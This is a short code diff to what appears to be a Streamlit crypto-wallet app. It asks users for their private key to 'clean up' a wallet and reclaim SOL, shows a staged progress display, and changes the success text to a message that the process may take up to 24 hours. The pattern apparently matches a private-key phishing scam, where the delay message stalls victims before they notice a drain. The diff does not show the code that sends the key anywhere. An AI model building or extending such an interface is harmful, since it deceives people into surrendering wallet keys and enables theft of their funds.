@@ -37,7 +37,8 @@ if menu == "Check Wallet ✅":
                         st.write("🔒 Cleanup process initiated...")
                         st.write("Optimizing wallet...")
                         time.sleep(2)
-                        st.success("✅ Cleanup completed! Your SOL has been reclaimed.")
+                        st.success("✅ Cleanup request received! The process may take up to 24 hours to complete.")
+                        st.write("You will be notified once the cleanup is done. Thank you for your patience!")
                     else:
                         st.error("Please enter your private key to proceed.")
             else:
